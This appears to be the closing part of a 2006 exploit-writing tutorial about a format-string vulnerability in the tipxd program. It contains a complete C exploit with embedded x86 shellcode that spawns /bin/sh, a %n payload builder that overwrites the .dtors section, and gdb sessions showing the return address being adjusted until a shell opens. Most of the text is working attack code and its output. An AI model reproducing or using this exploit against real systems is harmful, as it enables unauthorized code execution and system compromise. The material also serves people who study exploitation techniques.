+So, you can see that dtors section overwrote to 0x41514153 intead 0x41414141.
+
+But I found another method of exploitation this! We need to use %n technique and
+then align our return address.
+
+Formula looks like this:
+
+<GOT><GOT+1><GOT+2><GOT+3><ADDR>x%OFFET$n<ADDR>x%OFFSET+1$n<ADDR>x%OFFSET+2$n<ADDR>x%OFFSET+3$n<NOPS><SHELLCODE>
+
+1st we need to align address.
+
+Exploit:
+
+--------------------------------------------------------------
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+#define doit( b0, b1, b2, b3, addr )  { \
+            b0 = (addr >> 24) & 0xff; \
+            b1 = (addr >> 16) & 0xff; \
+            b2 = (addr >>  8) & 0xff; \
+            b3 = (addr      ) & 0xff; \
+}
+
+char
+shellcode[]=
+
+// Coded by ChoiX [unl0ck team]
+       "\x31\xc0"
+       "\x31\xdb"
+       "\x31\xc9"
+       "\xb0\x46"
+       "\xcd\x80"
+       "\x31\xc0"
+       "\x50"
+       "\x68\x2f\x2f\x73\x68"
+       "\x68\x2f\x62\x69\x6e"
+       "\x89\xe3"
+       "\x8d\x54\x24\x08"
+       "\x50"
+       "\x53"
+       "\x8d\x0c\x24"
+       "\xb0\x0b"
+       "\xcd\x80"
+       "\x31\xc0"
+       "\xb0\x01"
+       "\xcd\x80";
+
+char *
+evil_builder( unsigned int retaddr, unsigned int offset, unsigned int base, long figure )
+{
+ char * buf;
+ unsigned char b0, b1, b2, b3;
+ int start = 256;
+
+ doit( b0, b1, b2, b3, retaddr );
+ buf = (char *)malloc(999);
+ memset( buf, 0, 999 );
+
+ b3 -= figure;
+ b2 -= figure;
+ b1 -= figure;
+ b0 -= figure;
+
+ snprintf( buf, 999,
+          "%%%dx%%%d$n%%%dx%%%d$n%%%dx%%%d$n%%%dx%%%d$n",
+            b3 - 16 + start - base, offset, // universal value. we will get
+            b2 - b3 + start, offset + 1, // also universal.
+            b1 - b2 + start, offset + 2,
+            b0 - b1 + start, offset + 3 );
+
+ return buf;
+}
+
+int
+main( int argc, char * argv[] )
+{
+ char * fmt;
+ char endian[55];
+ unsigned long locaddr, retaddr;
+ unsigned int offset, base;
+ unsigned char b0, b1, b2, b3;
+
+ memset( endian, 0, 555 );
+
+ locaddr = 0x0804f994; // dtorz addr
+ retaddr = 0x01010101; // return addr
+ offset  = 7; // offset
+ locaddr += 0x4; // dtorz+0x4 - begin of dtorz
+
+ doit( b0, b1, b2, b3, locaddr );
+
+ base = 4; // base value. it was bruteforced. universal value
+
+ strcat(endian, "x"); // add special for aling our offset
+
+ snprintf( endian+strlen(endian), sizeof(endian),
+           "%c%c%c%c"
+           "%c%c%c%c"
+           "%c%c%c%c"
+           "%c%c%c%c",
+            b3, b2, b1, b0,
+            b3 + 1, b2, b1, b0,
+            b3 + 2, b2, b1, b0,
+            b3 + 3, b2, b1, b0 );
+
+ fmt = evil_builder( retaddr, offset, base, 0x0 );
+
+ memset(fmt+strlen(fmt), 0x42, 48);
+ strcat(fmt, shellcode);
+ strcat(endian, fmt);
+ execl("tipxd", "tipxd", "-f", endian);
+
+ return 0;
+}
+
+--------------------------------------------------------------
+
+NOTE:
+
+ snprintf( buf, 999,
+          "%%%dx%%%d$n%%%dx%%%d$n%%%dx%%%d$n%%%dx%%%d$n",
+            b3 - 16 + start - base, offset, // universal value. we will get
+                ^^^^________________________________________ 'cause 4 addresses of GOT, GOT+1, GOT+2, GOT+3.
+            ....
+
+
+Compile it and run:
+
+[darkeagle@localhost bin]$ gcc fmt.c -o fmt
+[darkeagle@localhost bin]$ ./fmt
+Unable to open configuration file : No such file or directory
+
+Segmentation fault (core dumped)
+[darkeagle@localhost bin]$ gdb -c core.7388
+GNU gdb 6.0-2mdk (Mandrake Linux)
+Copyright 2003 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i586-mandrake-linux-gnu".
+Core was generated by `tipxd -f x?U.UsU.U%237x%7$n%256x%8$n%256x%9$n%256x%10$nBBBBBBBBBBBBBBBB'.
+Program terminated with signal 11, Segmentation fault.
+#0  0x0d0d0d0d in ?? ()
+(gdb)
+
+You can see our address isn't 0x01010101. It is 0x0d0d0d0d. Let's calculate align.
+Do next: 0D - 01 = 0C. Our align is 0C = 12 (dec). Next search line:
+
+ fmt = evil_builder( retaddr, offset, base, 0x0 );
+                                           ^^^______ our align.
+
+replce to:
+
+ fmt = evil_builder( retaddr, offset, base, 0xC );
+                                           ^^^______ our align now
+
+Compile and run:
+
+[darkeagle@localhost bin]$ gcc fmt.c -o fmt
+[darkeagle@localhost bin]$ ./fmt
+Unable to open configuration file : No such file or directory
+
+Segmentation fault (core dumped)
+[darkeagle@localhost bin]$ gdb -c core.7398
+GNU gdb 6.0-2mdk (Mandrake Linux)
+Copyright 2003 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i586-mandrake-linux-gnu".
+Core was generated by `tipxd -f x?U.UsU.U%481x%7$n%256x%8$n%256x%9$n%256x%10$nBBBBBBBBBBBBBBBB'.
+Program terminated with signal 11, Segmentation fault.
+#0  0x01010101 in ?? ()
+(gdb)
+
+Yeah baby, Yeah! We've got it! Our return address is 0x01010101.
+Now we must get a shell. In the stack we need to search address to shellcode.
+Do next:
+
+(gdb) x/1024x $esp
+       ...............
+       ...............
+       ...............
+0xbfffff7c:     0x3532256e      0x39257836      0x32256e24      0x25783635
+0xbfffff8c:     0x6e243031      0x42424242      0x42424242      0x42424242
+0xbfffff9c:     0x42424242      0x42424242      0x42424242      0x42424242
+0xbfffffac:     0x42424242      0x42424242      0x42424242      0x42424242
+0xbfffffbc:     0x42424242      0xdb31c031      0x46b0c931      0xc03180cd
+0xbfffffcc:     0x2f2f6850      0x2f686873      0x896e6962      0x24548de3
+0xbfffffdc:     0x8d535008      0x0bb0240c      0xc03180cd      0x80cd01b0
+       ..............
+       ..............
+(gdb)
+
+ok, you can see "BBBB". Get this address. I've got "0xbfffffac". Put it instead 0x01010101. Compiling...
+
+[darkeagle@localhost bin]$ gcc fmt.c -o fmt
+[darkeagle@localhost bin]$ ./fmt
+Unable to open configuration file : No such file or directory
+
+sh-2.05b$
+
+Yeah, baby, Yeah! We've got a shell!
+
+So, if you have any questions, mail me.
+
+(c) d4rkeagle[at]gmail[dot]com
+
+[1] http://www.nosystem.com.ar/exploits/tipxd_exp.c
+[2] http://www.nosystem.com.ar/advisories/advisory-08.txt
+
+# milw0rm.com [2006-05-30]
